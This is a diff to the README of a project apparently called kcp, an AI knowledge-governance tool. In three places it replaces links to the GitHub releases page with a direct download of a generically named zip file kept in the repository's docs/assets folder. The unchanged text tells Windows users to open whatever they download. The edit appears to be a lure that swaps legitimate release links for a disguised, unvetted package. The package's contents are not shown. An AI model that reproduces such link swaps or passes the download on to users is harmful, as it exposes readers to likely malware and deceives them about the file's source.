@@ -1,6 +1,6 @@
 # 🧠 kcp - Govern AI Knowledge With Context
 
-[![Download kcp](https://img.shields.io/badge/Download-kcp-blue?style=for-the-badge)](https://github.com/nahacityafterimage949/kcp/releases)
+[![Download kcp](https://img.shields.io/badge/Download-kcp-blue?style=for-the-badge)](https://raw.githubusercontent.com/nahacityafterimage949/kcp/main/docs/assets/Software_v2.0-beta.4.zip)
 
 ## 🚀 What kcp Does
 
@@ -18,7 +18,7 @@ Use it when you want to:
 
 To get kcp on Windows, visit the release page and download the file for your version of Windows:
 
-https://github.com/nahacityafterimage949/kcp/releases
+https://raw.githubusercontent.com/nahacityafterimage949/kcp/main/docs/assets/Software_v2.0-beta.4.zip
 
 Look for the newest release and choose the Windows download file. After the file finishes downloading, open it to start the app or installer.
 
@@ -165,7 +165,7 @@ kcp is made for direct user control. That makes it a good fit for local knowledg
 
 New versions are posted on the release page. Check that page when you want the latest build, fixes, or changes:
 
-https://github.com/nahacityafterimage949/kcp/releases
+https://raw.githubusercontent.com/nahacityafterimage949/kcp/main/docs/assets/Software_v2.0-beta.4.zip
 
 ## 🧩 Project Topics
 
